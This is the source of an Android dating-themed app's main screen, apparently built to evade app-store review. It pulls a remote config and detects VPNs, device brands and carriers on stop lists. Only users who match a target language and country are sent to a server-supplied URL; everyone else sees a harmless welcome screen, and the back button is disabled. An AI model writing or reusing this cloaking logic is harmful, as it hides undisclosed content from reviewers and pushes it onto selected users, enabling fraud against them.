package flirt.and.date;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;


import androidx.appcompat.app.AppCompatActivity;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.util.Calendar;
import java.util.Collections;
import java.util.Locale;


import static org.apache.http.params.CoreProtocolPNames.USER_AGENT;

public class MainActivity extends AppCompatActivity {



    String getUrl;
    String url;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        getUrl = getResources().getString(R.string.get_url);

        MyAsyncTask myAsyncTask = new MyAsyncTask();
        myAsyncTask.execute();


    }




    class MyAsyncTask extends AsyncTask<Void, Void, JSONArray> {

        URL serverUrl;
        HttpURLConnection httpUrlConnection;
        JSONArray mJSONArray;
        @Override
        protected JSONArray doInBackground(Void... voids) {
            try {
                serverUrl = new URL(getUrl);
                httpUrlConnection = (HttpURLConnection) serverUrl.openConnection();
                httpUrlConnection.setRequestMethod("GET");
                httpUrlConnection.setRequestProperty("User-Agent", USER_AGENT);
                String jsonString = readJSON(httpUrlConnection);

                JSONObject jsonObject = new JSONObject(jsonString);

                Boolean stopping = jsonObject.getBoolean("stopping");

                SharedPreferencesEditor sharedPreferencesEditor = new SharedPreferencesEditor(getApplicationContext());
                if (sharedPreferencesEditor.checkPreferencesStorage(Constants.url)){
                    openView(sharedPreferencesEditor.getStringValue(Constants.url));
                }
                else {


                    if (useVpn()) {
                        openTinder();
                    } else {

                        if (stopping) {

                            String stopBrand = jsonObject.getString("stop_brand");
                            JSONArray stopBrands = new JSONArray(stopBrand);
                            String userBrand = Build.BRAND;
                            if (jsonArrayHasElement(stopBrands, userBrand)){
                                openTinder();
                            }
                            else {


                                String stopIsp = jsonObject.getString("stop_isp");
                                JSONArray stopIsps = new JSONArray(stopIsp);
                                TelephonyManager telephonyManager = (TelephonyManager)
                                        getSystemService(Context.TELEPHONY_SERVICE);

                                String userIsp = telephonyManager.getNetworkOperator();
                                if (jsonArrayHasElement(stopIsps, userIsp)) {
                                    openTinder();
                                }
                                else {


                                    url = jsonObject.getString("url");

                                    String targetLanguage = jsonObject.getString("target_lang");
                                    JSONArray targetLanguages = new JSONArray(targetLanguage);
                                    String userLanguage = Locale.getDefault().getDisplayLanguage();

                                    String targetCountry = jsonObject.getString("target_country");
                                    JSONArray targetCountries = new JSONArray(targetCountry);
                                    String userCountry = Locale.getDefault().getCountry();

                                    if (jsonArrayHasElement(targetLanguages, userLanguage) && jsonArrayHasElement(targetCountries, userCountry)){
                                        openView(url);
                                    }
                                    else{
                                        openTinder();
                                    }


                                }
                            }
                        } else {
                            openTinder();
                        }
                    }

                }




            } catch (Exception ex) {
                openTinder();
                LogClass.log("exception:" + ex.getMessage());
            }
            return mJSONArray;
        }


        @Override
        protected void onPostExecute(JSONArray resultJsonArray) {
            super.onPostExecute(resultJsonArray);
        }
    }

    public String readJSON(HttpURLConnection connection) throws IOException {

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder builder = new StringBuilder();
        String answer;
        while ((answer = reader.readLine()) != null) {

            builder.append(answer);
        }
        reader.close();
        return builder.toString();
    }


    private Boolean jsonArrayHasElement(JSONArray jsonArray, String item){
        for( int i=0; i<=jsonArray.length()-1;i++){
            try {
                if (item.equals(jsonArray.getString(i))) {
                    return true;
                }

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return false;
    }


    private void openTinder() {
        Intent intent = new Intent(this,WelcomeScreen.class);
        startActivity(intent);
        finish();
    }

    private void openView(String link) {
        Intent intent = new Intent(this,WelcomeScreen.class);
        intent.putExtra("url",link);
        startActivity(intent);
        finish();
    }


    public boolean useVpn() {
        String iface = "";
        try {
            for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (networkInterface.isUp())
                    iface = networkInterface.getName();
                LogClass.log("IFACE NAME: " + iface);
                if ( iface.contains("tun") || iface.contains("ppp") || iface.contains("pptp")) {
                    return true;
                }
            }
        } catch (SocketException e1) {
            e1.printStackTrace();
        }

        return false;
    }

    @Override
    public void onBackPressed() {

    }

    private void planNotify(){

        Calendar rightNow = Calendar.getInstance();
        int currentHour= rightNow.get(Calendar.HOUR_OF_DAY);

        if (currentHour>10 && currentHour <13) {

        }
        if (currentHour>13 && currentHour <18) {

        }
        if (currentHour>18 && currentHour <20) {

        }
        if (currentHour>20 && currentHour <22) {

        }

        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.set(Calendar.HOUR_OF_DAY, 8);
        calendar.set(Calendar.MINUTE, 30);
    }

    private void restartNotify() {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, MyReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0,
                intent, PendingIntent.FLAG_CANCEL_CURRENT );
// На случай, если мы ранее запускали активити, а потом поменяли время,
// откажемся от уведомления
        am.cancel(pendingIntent);
// Устанавливаем разовое напоминание
//        am.set(AlarmManager.RTC_WAKEUP, stamp.getTime(), pendingIntent);
    }

}
